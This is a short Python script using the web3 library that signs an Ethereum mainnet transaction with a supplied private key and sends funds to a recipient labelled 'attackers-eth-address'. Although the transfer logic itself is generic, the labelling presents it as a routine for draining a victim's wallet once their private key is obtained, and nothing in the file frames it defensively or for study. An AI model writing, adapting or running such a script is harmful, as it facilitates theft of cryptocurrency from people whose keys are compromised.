from web3 import Web3

def send_ethereum(private_key, amount):
    w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID"))
    account = w3.eth.account.privateKeyToAccount(private_key)
    nonce = w3.eth.getTransactionCount(account.address)
    tx = {
        'nonce': nonce,
        'to': 'attackers-eth-address',
        'value': w3.toWei(amount, 'ether'),
        'gas': 21000,
        'gasPrice': w3.toWei('50', 'gwei')
    }
    signed_tx = w3.eth.account.signTransaction(tx, private_key)
    tx_hash = w3.eth.sendRawTransaction(signed_tx.rawTransaction)
    print(f"Transaction sent successfully! TXID: {w3.toHex(tx_hash)}")

if __name__ == "__main__":
    private_key = "your_private_key"
    amount_to_send = 0.01
    send_ethereum(private_key, amount_to_send)
